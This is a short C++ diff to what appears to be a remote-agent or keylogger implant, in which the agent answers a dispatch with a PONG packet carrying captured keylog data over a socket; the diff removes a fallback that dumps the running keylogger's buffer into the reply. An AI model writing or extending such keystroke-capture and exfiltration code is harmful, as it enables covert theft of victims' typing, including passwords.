@@ -158,9 +158,6 @@ void Agent::handleDispatching(Packet&& packet) {
                 pong_payload = std::move(m_keylog_pending_data);
             }
         }
-        if (pong_payload.empty() && m_keylogger.isRunning()) {
-            pong_payload = m_keylogger.dump();
-        }
         Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
         std::vector<uint8_t> data = pong.serialize();
         m_socket.sendData(data);
